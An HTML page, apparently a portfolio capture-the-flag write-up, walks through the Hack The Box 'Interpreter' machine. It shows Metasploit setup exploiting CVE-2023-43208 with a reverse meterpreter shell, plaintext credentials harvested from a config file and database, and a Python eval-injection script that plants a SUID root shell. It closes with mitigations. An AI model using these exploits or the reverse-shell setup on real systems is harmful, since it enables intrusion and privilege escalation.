@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interpreter Writeup | Koussay Aydi</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <header class="topbar">
+        <div class="brand">
+            <div class="brand-mark">KA</div>
+            <div class="brand-info">
+                <p class="brand-label">Koussay Aydi</p>
+                <span class="brand-subtitle">Red Team Writeup</span>
+            </div>
+        </div>
+        <nav class="main-nav">
+            <a href="index.html">← Back to Portfolio</a>
+        </nav>
+    </header>
+
+    <main class="page-shell">
+        <article class="panel writeup-content">
+            <span class="eyebrow">Hack The Box — Linux Medium</span>
+            <h1>Interpreter Writeup</h1>
+            <p><strong>Author:</strong> Koussay Aydi | <strong>Tags:</strong> Deserialization RCE, Eval Injection, SUID, CVE-2023-43208</p>
+            <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
+
+            <h2>Machine Overview</h2>
+            <table>
+                <thead>
+                    <tr><th>Field</th><th>Details</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Target IP</td><td>`10.129.3.161`</td></tr>
+                    <tr><td>Machine Name</td><td>`interpreter`</td></tr>
+                    <tr><td>Operating System</td><td>Linux — Debian 12</td></tr>
+                    <tr><td>Difficulty</td><td>Medium</td></tr>
+                    <tr><td>CVE</td><td>CVE-2023-43208 — Mirth Connect Deserialization RCE</td></tr>
+                    <tr><td>User Flag</td><td>SSH as `sedric` / password `snowflake1`</td></tr>
+                    <tr><td>Root Flag</td><td></td></tr>
+                </tbody>
+            </table>
+
+            <h2>01. Initial Access — CVE-2023-43208</h2>
+            <h3>Vulnerability Overview</h3>
+            <p>Mirth Connect <strong>v4.4.0</strong> is affected by CVE-2023-43208, a critical Java deserialization vulnerability allowing unauthenticated Remote Code Execution. The Metasploit module <code>exploit/multi/http/mirth_connect_cve_2023_43208</code> provides a reliable exploitation path.</p>
+
+            <h3>Metasploit Configuration</h3>
+            <pre><code>msf > use exploit/multi/http/mirth_connect_cve_2023_43208
+msf exploit(...) > set RHOSTS 10.129.3.161
+msf exploit(...) > set RPORT 443
+msf exploit(...) > set LHOST 10.10.14.114
+msf exploit(...) > set FETCH_COMMAND WGET
+msf exploit(...) > run</code></pre>
+
+            <h3>Result</h3>
+            <pre><code>[+] The target appears to be vulnerable. Version 4.4.0 is affected by CVE-2023-43208.
+[*] Executing cmd/linux/http/x64/meterpreter/reverse_tcp (Unix Command)
+[+] The target appears to have executed the payload.
+[*] Meterpreter session 1 opened (10.10.14.114:4444 -> 10.129.3.161:55002)</code></pre>
+            <p>Shell upgraded via Python PTY:</p>
+            <pre><code>meterpreter > shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+mirth@interpreter:/usr/local/mirthconnect$ id
+uid=103(mirth) gid=111(mirth) groups=111(mirth)</code></pre>
+
+            <h2>02. Post-Exploitation — Credential Harvesting</h2>
+            <h3>Mirth Connect Configuration File</h3>
+            <p>The application config at <code>/usr/local/mirthconnect/conf/mirth.properties</code> contained database credentials in plaintext:</p>
+            <pre><code>database          = mysql
+database.url      = jdbc:mariadb://localhost:3306/mc_bdd_prod
+database.username = mirthdb
+database.password = MirthPass123!
+
+keystore.storepass = 5GbU5HGTOOgE
+keystore.keypass   = tAuJfQeXdnPw</code></pre>
+
+            <h3>Database Enumeration</h3>
+            <pre><code>mysql -u mirthdb -pMirthPass123! mc_bdd_prod
+
+MariaDB [mc_bdd_prod]> SELECT * FROM PERSON_PASSWORD;
+
++-----------+----------------------------------------------------------+---------------------+
+| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
++-----------+----------------------------------------------------------+---------------------+
+|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
++-----------+----------------------------------------------------------+---------------------+</code></pre>
+
+            <h3>Hash Cracking</h3>
+            <table>
+                <thead>
+                    <tr><th>Field</th><th>Value</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Hash (Base64)</td><td>`u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==`</td></tr>
+                    <tr><td>Format</td><td>Mirth Connect proprietary (SHA-256 + salt)</td></tr>
+                    <tr><td>Plaintext</td><td>`snowflake1`</td></tr>
+                    <tr><td>Account</td><td>`sedric`</td></tr>
+                </tbody>
+            </table>
+
+            <h3>SSH Access</h3>
+            <pre><code>ssh sedric@10.129.3.161
+# Password: snowflake1
+
+sedric@interpreter:~$ cat user.txt
+&lt;user flag&gt;</code></pre>
+
+            <h2>03. Privilege Escalation — eval() Injection</h2>
+            <h3>Process Enumeration</h3>
+            <p>Reviewing processes running as root revealed a Flask server on localhost:</p>
+            <pre><code>sedric@interpreter:~$ ps aux | grep root | grep python
+root  3542  ...  /usr/bin/python3 /usr/local/bin/notif.py
+
+sedric@interpreter:~$ ss -tlnp | grep 54321
+LISTEN 0  128  127.0.0.1:54321  0.0.0.0:*</code></pre>
+
+            <h3>Code Analysis — <code>notif.py</code></h3>
+            <p>The server accepts XML POST requests at <code>/addPatient</code> and passes field values through a <code>template()</code> function. The critical flaw is twofold:</p>
+            <ol>
+                <li>The input validation regex <strong>explicitly permits <code>{</code> and <code>}</code></strong>:
+                    <pre><code>pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")</code></pre>
+                </li>
+                <li>User-controlled input is interpolated into an f-string and passed to <strong><code>eval()</code></strong>:
+                    <pre><code>template = f"...received from {sender} at {ts}"
+return eval(f"f'''{template}'''")</code></pre>
+                </li>
+            </ol>
+            <p>Any Python expression placed inside <code>{}</code> within a controlled field is executed with root privileges.</p>
+
+            <h3>Exploit</h3>
+            <p>The payload targets the <code>sender_app</code> XML field, embedding a Python expression that decodes and executes a Base64-encoded shell command:</p>
+            <pre><code class="language-python">import requests, base64
+
+TARGET = "http://127.0.0.1:54321/addPatient"
+
+# Command: create SUID bash copy at /tmp/.sh
+cmd     = "install -o root -m 4755 /bin/bash /tmp/.sh"
+cmd_b64 = base64.b64encode(cmd.encode()).decode()
+
+injection = "{__import__('os').popen(__import__('base64').b64decode('" + cmd_b64 + "').decode()).read()}"
+
+xml = (
+    "&lt;patient&gt;"
+    "&lt;sender_app&gt;" + injection + "&lt;/sender_app&gt;"
+    "&lt;firstname&gt;a&lt;/firstname&gt;&lt;lastname&gt;a&lt;/lastname&gt;"
+    "&lt;timestamp&gt;a&lt;/timestamp&gt;"
+    "&lt;birth_date&gt;01/01/2000&lt;/birth_date&gt;"
+    "&lt;gender&gt;a&lt;/gender&gt;"
+    "&lt;/patient&gt;"
+)
+
+r = requests.post(TARGET, headers={"Content-Type": "application/xml"}, data=xml)
+print(r.text)</code></pre>
+
+            <h3>Root Shell</h3>
+            <pre><code>sedric@interpreter:/tmp$ /tmp/.sh -p
+
+.sh-5.2# whoami
+root
+
+.sh-5.2# cat /root/root.txt
+</code></pre>
+
+            <h2>04. Attack Chain Summary</h2>
+            <table>
+                <thead>
+                    <tr><th>#</th><th>Stage</th><th>Technique</th><th>Result</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>1</td><td>Initial Access</td><td>CVE-2023-43208 Deserialization RCE</td><td>Shell as `mirth`</td></tr>
+                    <tr><td>2</td><td>Credential Harvesting</td><td>Plaintext creds in `mirth.properties`</td><td>DB access as `mirthdb`</td></tr>
+                    <tr><td>3</td><td>Password Discovery</td><td>`PERSON_PASSWORD` table</td><td>Hash recovered</td></tr>
+                    <tr><td>4</td><td>Hash Cracking</td><td>Mirth Connect hash → plaintext</td><td>`snowflake1`</td></tr>
+                    <tr><td>5</td><td>Lateral Movement</td><td>SSH login</td><td>Shell as `sedric` + user flag</td></tr>
+                    <tr><td>6</td><td>Privilege Escalation</td><td>`eval()` injection in root Flask server</td><td>SUID bash → root flag</td></tr>
+                </tbody>
+            </table>
+
+            <h2>05. Mitigations</h2>
+            <h3>CVE-2023-43208</h3>
+            <p>Upgrade Mirth Connect to <strong>v4.4.1 or later</strong>. Restrict the admin interface to trusted networks and enforce authentication at the network layer.</p>
+
+            <h3>Plaintext Credentials in Config Files</h3>
+            <p>Sensitive values like database passwords must never be stored in plaintext. Use a secrets manager (HashiCorp Vault, AWS Secrets Manager, etc.) and restrict config file permissions to the owning service account only.</p>
+
+            <h3>Unsafe <code>eval()</code> in Server-Side Code</h3>
+            <p>Never pass user-controlled data to <code>eval()</code> or <code>exec()</code>. Replace with a safe templating engine such as Jinja2 (with sandboxing) or use <code>str.format_map()</code> with a restricted namespace. The regex whitelist here was a false control — it permitted the exact characters (<code>{}</code>) needed for code injection.</p>
+
+            <h3>Principle of Least Privilege</h3>
+            <p>The notification server only needed to write files to <code>/var/secure-health/patients/</code>. Running it as root was entirely unnecessary. A dedicated low-privilege service account would have made this privesc path impossible regardless of the code vulnerability.</p>
+
+            <div style="margin-top: 50px;">
+                <a href="index.html" class="btn btn-primary">Return Home</a>
+            </div>
+        </article>
+    </main>
+</body>
+</html>
